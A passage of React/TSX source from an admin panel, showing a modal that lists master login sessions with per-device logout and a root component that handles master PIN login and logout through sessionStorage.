      {renewConfirmApp && <RenewModal app={renewConfirmApp} masterPin={masterPin} onClose={() => setRenewConfirmApp(null)} onRenewed={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? { ...x, createdAt: a.createdAt, status: a.status } : x)); setRenewConfirmApp(null); }} />}

      {/* Master Sessions Modal */}
      {showSessions && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.75)", zIndex: 999, display: "flex", alignItems: "flex-end", justifyContent: "center", padding: "0 0 0 0" }} onClick={() => setShowSessions(false)}>
          <div onClick={e => e.stopPropagation()} style={{ background: "#0e1525", borderRadius: "20px 20px 0 0", width: "100%", maxWidth: 520, border: "1px solid #1f3050", borderBottom: "none", padding: "20px 16px 32px", maxHeight: "70vh", display: "flex", flexDirection: "column" }}>
            {/* Handle */}
            <div style={{ width: 36, height: 4, borderRadius: 2, background: "#1a2740", margin: "0 auto 18px" }} />
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 16, gap: 10 }}>
              <div>
                <div style={{ fontSize: 15, fontWeight: 800, color: "#f1f5f9" }}>Login Sessions</div>
                <div style={{ fontSize: 11, color: "#4d6280", marginTop: 2 }}>Master admin — active devices</div>
              </div>
              <button onClick={() => void fetchMasterSessions()} style={{ display: "flex", alignItems: "center", gap: 5, padding: "6px 12px", borderRadius: 8, background: "#0e1525", border: "1px solid #1f3050", color: "#7a95b4", fontSize: 11, fontWeight: 700, cursor: "pointer" }}>
                {sessionsLoading ? <Spinner /> : <Ic.Refresh />} Refresh
              </button>
            </div>
            <div style={{ overflowY: "auto", display: "flex", flexDirection: "column", gap: 8 }}>
              {sessionsLoading && masterSessions.length === 0 && (
                <div style={{ textAlign: "center", padding: 32, color: "#4d6280", display: "flex", alignItems: "center", justifyContent: "center", gap: 10 }}><Spinner /> Loading…</div>
              )}
              {!sessionsLoading && masterSessions.length === 0 && (
                <div style={{ textAlign: "center", padding: 32, color: "#4d6280" }}>Koi active session nahi mili.</div>
              )}
              {masterSessions.map(s => {
                const isCurrent = s.id === sessionId;
                const loginDate = new Date(s.loginAt);
                const dateStr = loginDate.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) + " " + loginDate.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true });
                return (
                  <div key={s.id} style={{ background: isCurrent ? "rgba(99,102,241,0.08)" : "#080e1c", borderRadius: 12, border: `1px solid ${isCurrent ? "#6366f180" : "#1a2740"}`, padding: "12px 14px", display: "flex", alignItems: "flex-start", gap: 12 }}>
                    <div style={{ width: 36, height: 36, borderRadius: 10, background: isCurrent ? "rgba(99,102,241,0.2)" : "#0e1525", border: `1px solid ${isCurrent ? "#6366f155" : "#1a2740"}`, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={isCurrent ? "#818cf8" : "#4d6280"} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 3 }}>
                        {isCurrent && <span style={{ fontSize: 9, fontWeight: 700, color: "#818cf8", background: "rgba(99,102,241,0.15)", border: "1px solid #6366f140", borderRadius: 99, padding: "1px 7px", letterSpacing: 0.5, textTransform: "uppercase" }}>Yeh device</span>}
                        <span style={{ fontSize: 11, color: "#f1f5f9", fontWeight: 700, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{s.ip || "IP unknown"}</span>
                      </div>
                      <div style={{ fontSize: 10, color: "#4d6280", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", marginBottom: 2 }}>{s.userAgent || "Unknown browser"}</div>
                      <div style={{ fontSize: 10, color: "#4d6280" }}>Login: {dateStr}</div>
                    </div>
                    <button onClick={() => void logoutMasterSession(s.id)} disabled={logoutingMSId === s.id} style={{ flexShrink: 0, padding: "6px 12px", borderRadius: 8, background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.25)", color: "#f87171", fontSize: 11, fontWeight: 700, cursor: logoutingMSId === s.id ? "wait" : "pointer", opacity: logoutingMSId === s.id ? 0.5 : 1 }}>
                      {logoutingMSId === s.id ? <Spinner /> : "Logout"}
                    </button>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      )}

    </div>
  );
}

/* ── Root Export ── */
export default function MainAdminPanel() {
  const [masterPin, setMasterPin] = useState<string | null>(() => sessionStorage.getItem("mrrobot_master_auth") ?? null);
  const [sessionId, setSessionId] = useState<string>(() => sessionStorage.getItem("mrrobot_master_sid") ?? "");
  function handleAuth(pin: string, sid: string) {
    sessionStorage.setItem("mrrobot_master_auth", pin);
    sessionStorage.setItem("mrrobot_master_sid", sid);
    setMasterPin(pin);
    setSessionId(sid);
  }
  function handleLogout() {
    sessionStorage.removeItem("mrrobot_master_auth");
    sessionStorage.removeItem("mrrobot_master_sid");
    setMasterPin(null);
    setSessionId("");
  }
  function handlePinChanged(newPin: string) { sessionStorage.setItem("mrrobot_master_auth", newPin); setMasterPin(newPin); alert("Master PIN changed successfully!"); }
  if (!masterPin) return <MasterLogin onAuth={handleAuth} />;
  return <Dashboard masterPin={masterPin} sessionId={sessionId} onLogout={handleLogout} onPinChanged={handlePinChanged} />;
}
